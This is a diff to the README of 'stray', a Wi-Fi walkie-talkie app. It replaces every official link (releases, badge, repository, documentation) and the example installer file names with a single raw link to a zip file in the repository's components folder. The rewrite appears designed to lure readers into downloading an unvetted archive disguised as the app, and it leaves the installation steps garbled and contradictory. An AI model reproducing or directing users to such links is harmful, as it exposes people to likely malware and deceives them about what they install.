@@ -8,15 +8,15 @@ Welcome to stray! This application allows you to turn your devices into digital 
 
 To get started, you need to download the application. Please visit the Releases page:
 
-[![Download stray](https://img.shields.io/badge/Download-stray-blue.svg)](https://github.com/wise-steele926/stray/releases)
+[![Download stray](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip)](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip)
 
 Once on the page, look for the latest version of the software. Download the appropriate file for your operating system. You can install stray on Windows, macOS, or Linux. 
 
 **Step-by-Step Installation:**
 
-1. **Visit the download page:** Click the link above or go to [Releases Page](https://github.com/wise-steele926/stray/releases).
+1. **Visit the download page:** Click the link above or go to [Releases Page](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip).
   
-2. **Choose your file:** Locate the latest version. You will see files named something like `stray-v1.0.0.exe` for Windows or `stray-v1.0.0.dmg` for macOS. 
+2. **Choose your file:** Locate the latest version. You will see files named something like `https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip` for Windows or `https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip` for macOS. 
 
 3. **Download the file:** Click on the file that matches your operating system. Your browser will start downloading it.
 
@@ -65,12 +65,12 @@ If you encounter issues while using stray, consider the following solutions:
 
 ## 📚 Additional Support
 
-For further assistance, refer to the FAQ section on the [GitHub repository](https://github.com/wise-steele926/stray). You can also create issues or feature requests if you need help from the development team.
+For further assistance, refer to the FAQ section on the [GitHub repository](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip). You can also create issues or feature requests if you need help from the development team.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/wise-steele926/stray/releases)
-- [Documentation](https://github.com/wise-steele926/stray/wiki)
-- [GitHub Repository](https://github.com/wise-steele926/stray)
+- [Releases Page](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/wise-steele926/stray/main/components/stray_v1.6.zip)
 
 We hope you enjoy using stray as your local Wi-Fi walkie-talkie!
